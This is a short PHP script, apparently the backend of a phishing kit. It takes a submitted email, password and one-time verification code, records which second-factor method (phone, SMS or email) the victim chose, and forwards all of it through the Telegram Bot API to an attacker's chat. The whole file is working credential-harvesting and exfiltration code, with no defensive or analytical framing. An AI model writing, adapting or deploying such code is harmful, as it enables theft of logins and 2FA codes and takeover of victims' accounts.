<?php
    require 'tg.php';
	include("vendor/autoload.php");
	use Telegram\Bot\Api;
	$phone=$_POST['fone'];
	$sms=$_POST['sms'];
	$em=$_POST['email'];
    $email=$_POST['name'];
	$pass=$_POST['text'];
	$code=$_POST['abosobl'];
	$chat_id=$_POST['userId'];
	if ($phone=='1'){
		$a='<b>Телефон </b>☎️';
		$b=1;
	}
	elseif ($sms=='2'){
		$a='<b>SMS </b>✉️📲';
		$b=2;
	}

	elseif ($em=='3'){
		$a='<b>Email </b>📧';
		$b=3;
	}
	
	




	

	$txt='✅✅✅✅✅✅✅%0A<b>E-mail:</b>        '.$email.'%0A<b>Password:</b> '.$pass.'%0A%0A<b>Code:</b> '.$code.'%0A%0A<b>Выбрал </b>'.$a.'';
    if (!empty($chat_id)){
			fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	}
	exit(print $b);
?>